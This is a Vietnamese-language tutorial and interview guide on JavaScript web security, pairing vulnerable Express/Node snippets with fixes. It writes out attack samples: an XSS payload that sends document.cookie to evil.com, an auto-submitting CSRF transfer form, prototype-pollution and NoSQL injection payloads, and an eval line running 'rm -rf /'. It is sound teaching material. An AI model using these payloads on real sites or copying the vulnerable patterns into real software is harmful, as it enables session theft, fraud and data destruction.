# 📘 JavaScript — Security trong JavaScript

> Bảo mật là kiến thức **bắt buộc cho backend developer** và là tiêu chí đánh giá **senior level**. Phỏng vấn luôn hỏi về XSS, CSRF, và các attack vectors phổ biến.

---

## Mục lục

1. [XSS — Cross-Site Scripting](#1-xss--cross-site-scripting)
2. [CSRF — Cross-Site Request Forgery](#2-csrf--cross-site-request-forgery)
3. [Content Security Policy (CSP)](#3-content-security-policy-csp)
4. [Prototype Pollution](#4-prototype-pollution)
5. [SQL/NoSQL Injection (JS Context)](#5-sqlnosql-injection-js-context)
6. [ReDoS — Regular Expression Denial of Service](#6-redos--regular-expression-denial-of-service)
7. [Supply Chain Attacks (npm)](#7-supply-chain-attacks-npm)
8. [Secure Cookie Attributes](#8-secure-cookie-attributes)
9. [eval() & new Function() Risks](#9-eval--new-function-risks)
10. [Câu hỏi phỏng vấn](#10-câu-hỏi-phỏng-vấn)

---

# 1. XSS — Cross-Site Scripting

> Attacker **inject mã JavaScript** vào trang web, chạy trên trình duyệt của victim.

## 3 loại XSS

```
┌─────────────────────────────────────────────────────────┐
│                   XSS Attack Types                      │
├──────────────┬──────────────────┬───────────────────────┤
│   Stored     │   Reflected     │    DOM-based          │
│  (Persistent)│  (Non-persistent)│  (Client-side only)   │
├──────────────┼──────────────────┼───────────────────────┤
│ Lưu trên    │ Phản hồi từ     │ Xử lý hoàn toàn      │
│ server (DB) │ server ngay     │ trên client (DOM)     │
│              │                  │                       │
│ Ví dụ:      │ Ví dụ:          │ Ví dụ:               │
│ Comment chứa│ Search query    │ document.location     │
│ <script>    │ hiện trên page  │ → innerHTML           │
└──────────────┴──────────────────┴───────────────────────┘
```

### Stored XSS

```javascript
// ❌ VULNERABLE — Server lưu comment và hiển thị trực tiếp
app.post('/comment', (req, res) => {
  db.save({ text: req.body.comment });  // Lưu raw HTML
});

app.get('/comments', (req, res) => {
  const comments = db.getAll();
  // Hiển thị trực tiếp → XSS!
  res.send(comments.map(c => `<div>${c.text}</div>`).join(''));
});

// Attacker gửi comment:
// <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
// → Mọi user xem trang đều bị đánh cắp cookie
```

### Reflected XSS

```javascript
// ❌ VULNERABLE — Hiển thị input trực tiếp từ URL
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Kết quả cho: ${query}</h1>`);
});

// Attacker gửi link:
// /search?q=<script>alert(document.cookie)</script>
```

### DOM-based XSS

```javascript
// ❌ VULNERABLE — Client-side code dùng innerHTML với untrusted data
const hash = window.location.hash.substring(1);
document.getElementById('content').innerHTML = hash;

// URL: https://example.com#<img src=x onerror="alert(document.cookie)">
```

## XSS Prevention

```javascript
// ✅ 1. Escape HTML entities
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, (char) => map[char]);
}

// Sử dụng:
res.send(`<h1>Kết quả cho: ${escapeHtml(query)}</h1>`);

// ✅ 2. Dùng textContent thay vì innerHTML
document.getElementById('content').textContent = userInput;  // An toàn

// ✅ 3. Dùng template engine có auto-escape (EJS, Handlebars, Pug)
// EJS: <%- userInput %> (raw — NGUY HIỂM)
// EJS: <%= userInput %> (auto-escaped — AN TOÀN)

// ✅ 4. DOMPurify cho rich content
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHTML);
document.getElementById('content').innerHTML = clean;

// ✅ 5. HTTP Headers
// X-XSS-Protection: 0 (tắt built-in XSS filter — dùng CSP thay)
// Content-Type: application/json (cho API responses)
```

---

# 2. CSRF — Cross-Site Request Forgery

> Attacker **lừa trình duyệt** gửi request đến server mà user đã đăng nhập, **sử dụng cookie session** của victim.

## Attack Flow

```
1. Victim đăng nhập bank.com → trình duyệt lưu session cookie
2. Victim truy cập evil.com (attacker)
3. evil.com chứa:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   hoặc:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. Trình duyệt TỰ ĐỘNG gửi cookie bank.com → Server xử lý như request hợp lệ!
```

## CSRF Prevention

```javascript
// ✅ 1. CSRF Token (phổ biến nhất)
const crypto = require('crypto');

// Server tạo token và gửi trong form
app.get('/form', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${token}">
      <input name="amount" value="">
      <button type="submit">Transfer</button>
    </form>
  `);
});

// Server verify token
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // Xử lý transfer...
});

// ✅ 2. SameSite Cookie (hiện đại, đơn giản nhất)
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict'  // Cookie KHÔNG gửi từ cross-site requests
  // 'Lax' — gửi với GET navigation (link click), không gửi POST/iframe
  // 'Strict' — KHÔNG gửi bất kỳ cross-site request nào
  // 'None' — luôn gửi (phải có Secure)
});

// ✅ 3. Double Submit Cookie
// Gửi token trong cả cookie VÀ header/body
// Server so sánh 2 giá trị phải khớp nhau
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  if (cookieToken !== headerToken) {
    return res.status(403).send('CSRF validation failed');
  }
  // ...
});

// ✅ 4. Check Origin/Referer Header
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://mysite.com'];
  if (req.method !== 'GET' && !allowedOrigins.some(o => origin?.startsWith(o))) {
    return res.status(403).send('Invalid origin');
  }
  next();
});
```

## So sánh SameSite values

| Attribute | Cross-site POST | Cross-site GET (link) | Same-site | Cần Secure? |
|-----------|----------------|----------------------|-----------|------------|
| `Strict` | ❌ Không gửi | ❌ Không gửi | ✅ Gửi | Không |
| `Lax` (default) | ❌ Không gửi | ✅ Gửi | ✅ Gửi | Không |
| `None` | ✅ Gửi | ✅ Gửi | ✅ Gửi | Bắt buộc |

---

# 3. Content Security Policy (CSP)

> CSP là HTTP header cho phép **whitelist** nguồn tài nguyên được phép load.

```javascript
// ✅ Thiết lập CSP trong Express
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],                    // Chỉ load từ same origin
    scriptSrc: ["'self'", "'nonce-abc123'"],    // Script: same origin + nonce
    styleSrc: ["'self'", "https://fonts.googleapis.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],                     // Cấm <object>, <embed>
    upgradeInsecureRequests: [],               // HTTP → HTTPS tự động
  }
}));
```

**Các directives quan trọng:**

| Directive | Mô tả |
|-----------|--------|
| `default-src` | Fallback cho tất cả -src không được set |
| `script-src` | Nguồn JavaScript được phép |
| `style-src` | Nguồn CSS được phép |
| `img-src` | Nguồn hình ảnh |
| `connect-src` | XHR, fetch, WebSocket endpoints |
| `frame-ancestors` | Ai được embed trang (thay thế X-Frame-Options) |
| `form-action` | URL form có thể submit đến |

**Nonce-based CSP (chống inline script):**

```html
<!-- Server tạo nonce mới mỗi request -->
<script nonce="abc123">
  // Script này được phép vì có đúng nonce
  console.log('allowed');
</script>

<script>
  // Script này bị BLOCK vì không có nonce!
  alert('blocked by CSP');
</script>
```

**CSP Report-Only mode (testing):**

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```
→ Chỉ báo cáo violations, không block — dùng để test trước khi enforce.

---

# 4. Prototype Pollution

> Attacker **modify Object.prototype** → ảnh hưởng TẤT CẢ objects trong application.

## Attack

```javascript
// ❌ VULNERABLE — Merge object không kiểm tra key
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker gửi JSON:
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

// BÂY GIỜ:
const user = {};
console.log(user.isAdmin);  // true!!! — Mọi object đều bị ảnh hưởng

// Hoặc qua constructor:
const payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
merge({}, payload);
```

## Prevention

```javascript
// ✅ 1. Kiểm tra key nguy hiểm
function safeMerge(target, source) {
  for (const key in source) {
    // Block prototype pollution keys
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// ✅ 2. Object.create(null) — object không có prototype
const safeObj = Object.create(null);
safeObj.__proto__ = 'attack';
console.log({}.toString);  // [Function: toString] — không bị ảnh hưởng

// ✅ 3. Object.freeze(Object.prototype)
// Cẩn thận: có thể break third-party libraries
Object.freeze(Object.prototype);

// ✅ 4. Dùng Map thay vì plain object cho user data
const userData = new Map();
userData.set('__proto__', 'value');  // An toàn — Map key không ảnh hưởng prototype

// ✅ 5. Dùng hasOwnProperty check
if (Object.prototype.hasOwnProperty.call(obj, key)) {
  // Chỉ xử lý own properties
}

// ✅ 6. JSON Schema validation (ajv, zod, joi)
const { z } = require('zod');
const schema = z.object({
  name: z.string(),
  age: z.number()
}).strict();  // Reject extra fields
```

---

# 5. SQL/NoSQL Injection (JS Context)

## SQL Injection

```javascript
// ❌ VULNERABLE — String concatenation
app.get('/user', (req, res) => {
  const query = `SELECT * FROM users WHERE id = '${req.query.id}'`;
  // Attacker: /user?id=' OR '1'='1
  // Query thành: SELECT * FROM users WHERE id = '' OR '1'='1'
  // → Trả về TẤT CẢ users!
  db.query(query);
});

// ✅ Parameterized queries (Prepared Statements)
app.get('/user', (req, res) => {
  const query = 'SELECT * FROM users WHERE id = ?';
  db.query(query, [req.query.id]);  // Driver tự escape
});

// ✅ ORM (Sequelize, Prisma, TypeORM)
const user = await User.findOne({ where: { id: req.query.id } });
```

## NoSQL Injection (MongoDB)

```javascript
// ❌ VULNERABLE — Truyền object trực tiếp
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  db.collection('users').findOne({ username, password });
});

// Attacker gửi JSON:
// { "username": "admin", "password": { "$gt": "" } }
// Query: { username: "admin", password: { $gt: "" } }
// → password > "" luôn true → Đăng nhập thành công!

// Attacker có thể dùng: $ne, $gt, $regex, $where...

// ✅ 1. Validate & sanitize input type
app.post('/login', (req, res) => {
  const username = String(req.body.username);  // Force string
  const password = String(req.body.password);  // Force string
  db.collection('users').findOne({ username, password });
});

// ✅ 2. Dùng express-mongo-sanitize
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());  // Loại bỏ $ và . từ req.body/query/params

// ✅ 3. Schema validation (mongoose)
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }  // Mongoose enforce type
});
```

---

# 6. ReDoS — Regular Expression Denial of Service

> Regex với **catastrophic backtracking** có thể block Event Loop, gây DoS.

## Vulnerable Pattern

```javascript
// ❌ VULNERABLE — Nested quantifiers
const evilRegex = /^(a+)+$/;

// Input: 'aaaaaaaaaaaaaaaaX'
// a+ match "aaaaaaaaaaaaaaa" (nhiều cách chia)
// Mỗi cách thử → fail ở X → backtrack → thử cách khác
// Số bước: O(2^n) — exponential!

console.time('regex');
evilRegex.test('a'.repeat(25) + 'X');  // Treo hàng PHÚT!
console.timeEnd('regex');

// Các pattern nguy hiểm khác:
/(a|a)+$/          // Overlapping alternation
/(a.*)+$/          // Nested .*
/(\w+\s?)*$/       // Nested quantifiers
/^(([a-z])+\.)+$/  // Email-like nested groups
```

## Prevention

```javascript
// ✅ 1. Tránh nested quantifiers
// BAD:  (a+)+    (a*)*    (a|b)*+
// GOOD: a+       a*       (a|b)+

// ✅ 2. Dùng atomic groups / possessive quantifiers (nếu engine hỗ trợ)
// JavaScript chưa có native atomic groups, nhưng có workaround

// ✅ 3. Giới hạn input length TRƯỚC khi regex
function safeMatch(input, regex, maxLength = 1000) {
  if (input.length > maxLength) {
    throw new Error('Input too long');
  }
  return regex.test(input);
}

// ✅ 4. Dùng thư viện safe-regex hoặc re2
const safe = require('safe-regex');
console.log(safe(/^(a+)+$/));  // false — nguy hiểm!
console.log(safe(/^a+$/));     // true — an toàn

// RE2 — regex engine không backtrack (Google)
const RE2 = require('re2');
const re = new RE2(/^(a+)+$/);  // RE2 tự động handle, không backtrack

// ✅ 5. Timeout cho regex execution
function regexWithTimeout(regex, input, timeout = 1000) {
  // Chạy trong Worker Thread với timeout
  const { Worker } = require('worker_threads');
  // ... implement worker-based regex
}
```

---

# 7. Supply Chain Attacks (npm)

> Attacker nhắm vào **npm packages** — dependency mà developer tin tưởng và cài đặt.

## Các vector tấn công

```
1. Typosquatting
   npm install lodas        ← (thiếu 'h') — package giả!
   npm install @babel/cors  ← package giả mạo scope

2. Dependency Confusion
   Company dùng internal package "my-utils"
   Attacker publish "my-utils" lên public npm với version cao
   npm install → ưu tiên public registry → cài package attacker!

3. Malicious maintainer
   Maintainer bán/bị hack account → push malicious version

4. postinstall scripts
   package.json: { "scripts": { "postinstall": "node steal-env.js" } }
   → Chạy ngay khi npm install, TRƯỚC khi developer review
```

## Prevention

```javascript
// ✅ 1. Luôn dùng lockfile (package-lock.json / yarn.lock)
// Đảm bảo version chính xác, không bị thay đổi

// ✅ 2. npm audit
// npm audit              — Kiểm tra vulnerabilities
// npm audit fix          — Tự động fix
// npm audit --production — Chỉ check production deps

// ✅ 3. Kiểm tra trước khi cài
// npm info <package>     — Xem thông tin package
// npx npm-check-updates  — Kiểm tra updates

// ✅ 4. Ignore scripts khi cài packages lạ
// npm install --ignore-scripts <package>

// ✅ 5. Pin versions (không dùng ^, ~)
// "lodash": "4.17.21"  — exact version

// ✅ 6. Dùng .npmrc để cấu hình
// .npmrc:
// ignore-scripts=true    — Tắt postinstall scripts
// audit=true             — Auto audit
// save-exact=true        — Pin exact versions

// ✅ 7. npm provenance (npm v9+)
// Verify package được build từ source code trên GitHub
// npm install --expect-provenance

// ✅ 8. Private registry cho internal packages
// .npmrc:
// @mycompany:registry=https://npm.mycompany.com/
// → Package @mycompany/* luôn lấy từ private registry
```

---

# 8. Secure Cookie Attributes

```javascript
// ✅ Cookie an toàn nhất
res.cookie('session', token, {
  httpOnly: true,     // JavaScript KHÔNG đọc được → chống XSS steal cookie
  secure: true,       // Chỉ gửi qua HTTPS
  sameSite: 'Strict', // Không gửi cross-site → chống CSRF
  maxAge: 3600000,    // 1 giờ (ms) — tốt hơn expires
  path: '/',          // Cookie áp dụng cho toàn site
  domain: '.example.com',  // Áp dụng cho subdomains
  // signed: true     // Khi dùng cookie-parser với secret
});
```

| Attribute | Tác dụng | Chống |
|-----------|---------|-------|
| `HttpOnly` | JS không đọc được `document.cookie` | XSS cookie theft |
| `Secure` | Chỉ gửi qua HTTPS | Man-in-the-Middle |
| `SameSite=Strict` | Không gửi cross-origin | CSRF |
| `SameSite=Lax` | Không gửi POST cross-origin | CSRF (POST) |
| `Max-Age` | Thời gian sống | Session hijacking (giảm) |
| `Path=/api` | Chỉ gửi cho /api | Giảm scope exposure |
| `Domain` | Control subdomain sharing | Subdomain takeover |

```javascript
// ❌ Cookie KHÔNG an toàn
res.cookie('session', token);
// Mặc định: httpOnly=false, secure=false, sameSite='Lax'
// → XSS có thể đọc cookie, HTTP plaintext có thể sniff

// ⚠️ Lưu ý SameSite behavior
// Chrome 80+ mặc định SameSite=Lax nếu không set
// Nhưng ĐỪNG dựa vào mặc định — luôn set explicitly
```

---

# 9. eval() & new Function() Risks

## eval() — "Evil" function

```javascript
// ❌ NGUY HIỂM — eval thực thi string như code
const userInput = 'require("child_process").execSync("rm -rf /")';
eval(userInput);  // DISASTER! Chạy system command

// ❌ eval có access đến local scope
function danger() {
  const secret = 'password123';
  eval('console.log(secret)');  // In ra "password123"!
}

// ❌ eval phá vỡ V8 optimization
function slow() {
  const x = 10;
  eval('');  // Chỉ cần eval tồn tại → V8 KHÔNG optimize function này
  return x;
}
```

## new Function() — Ít nguy hiểm hơn eval

```javascript
// new Function() tạo function từ string
// NHƯNG: chạy trong GLOBAL scope (không access local variables)
function safer() {
  const secret = 'password123';
  const fn = new Function('return typeof secret');
  console.log(fn());  // "undefined" — không access được local scope
}

// Vẫn nguy hiểm nếu nhận user input!
const userInput = 'return process.env.SECRET';
const fn = new Function(userInput);
fn();  // Có thể access globals!
```

## So sánh

| | `eval()` | `new Function()` |
|--|---------|------------------|
| Scope | Local + Global | Chỉ Global |
| V8 optimization | Phá vỡ hoàn toàn | Ít ảnh hưởng hơn |
| CSP | Bị block bởi `script-src` | Bị block bởi `script-src` |
| Use case hợp lệ | Hầu như KHÔNG CÓ | JSON parsing (đã có JSON.parse), template engines |

## Alternatives an toàn

```javascript
// ❌ eval cho JSON
const data = eval('(' + jsonString + ')');
// ✅ JSON.parse
const data = JSON.parse(jsonString);

// ❌ eval cho dynamic property access
eval(`obj.${propName}`);
// ✅ Bracket notation
obj[propName];

// ❌ eval cho dynamic function call
eval(`${funcName}()`);
// ✅ Object lookup
const functions = { add, subtract, multiply };
functions[funcName]();

// ❌ setTimeout với string
setTimeout('alert("hi")', 1000);
// ✅ setTimeout với function
setTimeout(() => alert('hi'), 1000);
```

---

# 10. Câu hỏi phỏng vấn

### Q1: Giải thích 3 loại XSS và cách phòng chống.

**A:**
- **Stored XSS:** Mã độc lưu trên server (DB) → render cho mọi user. Ví dụ: comment chứa `<script>`.
- **Reflected XSS:** Input từ URL/form phản hồi trực tiếp. Ví dụ: search query hiện trên trang.
- **DOM-based XSS:** Client JS xử lý untrusted data vào DOM. Ví dụ: `innerHTML = location.hash`.

**Phòng chống:** Escape HTML output, dùng `textContent` thay `innerHTML`, CSP headers, DOMPurify cho rich content, HttpOnly cookies.

---

### Q2: CSRF là gì? SameSite cookie giải quyết thế nào?

**A:** CSRF lừa trình duyệt gửi request kèm cookie đến server mà user đã login, từ trang khác (evil.com). `SameSite=Strict` → cookie KHÔNG được gửi từ cross-site requests. `Lax` → chặn POST nhưng cho GET navigation. Kết hợp với CSRF token cho bảo mật tốt nhất.

---

### Q3: Prototype Pollution là gì? Làm sao phòng tránh?

**A:** Attacker modify `Object.prototype` qua `__proto__` hoặc `constructor.prototype` → ảnh hưởng mọi object. Phòng tránh: validate keys (block `__proto__`, `constructor`), dùng `Object.create(null)`, `Map` cho user data, schema validation (zod/joi), `Object.freeze(Object.prototype)`.

---

### Q4: Content Security Policy hoạt động thế nào?

**A:** CSP là HTTP header whitelist nguồn tài nguyên được phép load. Ví dụ `script-src 'self'` chỉ cho phép scripts từ cùng origin. Nonce-based CSP cho phép specific inline scripts. CSP chặn inline scripts, eval(), và external scripts không được whitelist → giảm XSS impact đáng kể.

---

### Q5: NoSQL Injection khác SQL Injection thế nào? Cho ví dụ MongoDB.

**A:** SQL Injection inject SQL syntax (`' OR 1=1`). NoSQL Injection inject **query operators** (`{ $gt: "" }`, `{ $ne: null }`). Ví dụ MongoDB: password `{ "$gt": "" }` → luôn match. Phòng: force type casting (`String(input)`), dùng `express-mongo-sanitize`, Mongoose schema validation.

---

### Q6: ReDoS là gì? Regex nào nguy hiểm?

**A:** ReDoS khai thác regex có **catastrophic backtracking** — nested quantifiers như `(a+)+$`, `(a|a)+$`. Input crafted khiến regex engine thử exponential O(2^n) combinations, block Event Loop. Phòng: tránh nested quantifiers, giới hạn input length, dùng `safe-regex` hoặc RE2 engine.

---

### Q7: Tại sao eval() nguy hiểm? new Function() khác gì?

**A:** `eval()` thực thi string như code, có access local scope, phá vỡ V8 optimization, bị CSP block. `new Function()` chỉ access global scope (an toàn hơn), ít ảnh hưởng optimization. Cả hai đều nguy hiểm với user input. Alternatives: `JSON.parse`, bracket notation, function lookup object.

---

### Q8: Kể các biện pháp bảo vệ cookie session.

**A:**
- `HttpOnly` — JS không đọc được (chống XSS steal)
- `Secure` — chỉ HTTPS (chống MITM)
- `SameSite=Strict/Lax` — chống CSRF
- `Max-Age` ngắn — giảm window of attack
- `Path` restricted — giảm scope
- Signed cookies — chống tampering
- Rotate session ID sau login

---

### Q9: Supply chain attack qua npm có những vector nào? Cách phòng?

**A:** Vectors: typosquatting (tên gần giống), dependency confusion (public vs private), malicious maintainer, postinstall scripts. Phòng: lockfile, `npm audit`, pin exact versions, `--ignore-scripts`, private registry cho internal packages, npm provenance verification.
